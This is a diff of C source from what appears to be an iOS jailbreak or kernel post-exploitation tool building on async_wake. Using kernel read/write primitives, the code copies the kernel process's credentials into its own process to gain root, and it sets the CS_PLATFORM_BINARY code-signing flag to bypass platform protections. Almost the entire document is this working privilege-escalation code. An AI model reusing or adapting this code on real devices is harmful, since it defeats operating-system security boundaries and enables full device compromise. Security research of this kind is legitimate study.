@@ -29,7 +29,7 @@
 // uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
 // found in async_wake.c:437
 // but we return the bsd_info rather than the vm_map
-uint64_t get_process_pid(uint32_t pid) {
+uint64_t get_process_bsdinfo(uint32_t pid) {
     
     // task_self_addr points to the struct ipc_port for our task port
     uint64_t task_self = task_self_addr();
@@ -51,7 +51,7 @@ uint64_t get_process_pid(uint32_t pid) {
     return -1;
 }
 
-uint64_t get_process_pid_from_name(char* procname){
+uint64_t get_process_bsdinfo_from_name(char* procname){
     
     // task_self_addr points to the struct ipc_port for our task port
     uint64_t task_self = task_self_addr();
@@ -78,13 +78,30 @@ uint64_t get_process_pid_from_name(char* procname){
     return -1;
 }
 
+//get the current value of cflags for a given process.
+//requires the memory location of the cflags, use get_csflags_loc to retrieve this
+uint32_t get_csflags(){
+    uint64_t proc_bsd = get_process_bsdinfo(getpid());
+    uint32_t csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS));
+    return csflags;
+}
+
+//sets the csflags of a process. Takes the memory location of the csflags to set
+//get the memory location using get_csflags_loc
+uint32_t set_csflags(uint32_t csflag){
+    uint64_t proc_bsd = get_process_bsdinfo(getpid());
+    uint32_t n_csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS)) | csflag;
+    wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), n_csflags);
+    return -1;
+}
+
 uid_t get_root(){
     uid_t olduid = getuid();
     printf("Current PID: %d, UID: %d\n",getpid(),olduid);
     
     //get the process address for the current process
     printf("Get current process bsd_info\n");
-    uint64_t proc_bsd = get_process_pid(getpid());
+    uint64_t proc_bsd = get_process_bsdinfo(getpid());
     if(proc_bsd == -1) {
         printf("Failed to get current process bsd_info\n");
         return olduid;
@@ -93,7 +110,7 @@ uid_t get_root(){
     
     //get process address for the kernel process
     printf("Get kernel process bsd_info\n");
-    uint64_t kernel_bsd = get_process_pid(0);
+    uint64_t kernel_bsd = get_process_bsdinfo(0);
     if(kernel_bsd == -1) {
         printf("Failed to get Kernel bsd_info\n");
         return olduid;
@@ -116,18 +133,18 @@ uid_t get_root(){
      */
     //get the ucred from the kernel KStruct
     printf("Extract kernel ucred\n");
-    uint64_t kernel_ucred = rk64(kernel_bsd + 0x100);
+    uint64_t kernel_ucred = rk64(kernel_bsd + koffset(KSTRUCT_OFFSET_UCRED));
     printf("Found kernel_ucred: %llx\n", kernel_ucred);
     
     //overwrite the current ucred with the kernel's ucred
     printf("Replacing current ucred with kernel's\n");
-    wk64(proc_bsd + 0x100 , kernel_ucred);
+    wk64(proc_bsd + koffset(KSTRUCT_OFFSET_UCRED) , kernel_ucred);
     printf("Successfully stole kern_ucred!\n");
     
     //set our uid to root :D
     setuid(0);
     printf("PID: %d, UID: %d\n",getpid(), getuid());
-       
+    
     //return the olduid so we can reset it down the line
     return olduid;
 }
@@ -136,4 +153,12 @@ void reset_root(uid_t olduid){
     setuid(olduid);
     printf("Reset our UID\n");
     printf("PID: %d, UID: %d\n",getpid(), getuid());
+}
+
+void setPlatform(){
+    uint32_t c_csflags = get_csflags();
+    printf("Current csflags: 0x%08x\n",c_csflags);
+    printf("Setting csflags 'CS_PLATFORM_BINARY'\n");
+    set_csflags(0x4000000);
+    printf("New csflags: 0x%08x\n",get_csflags());
 }
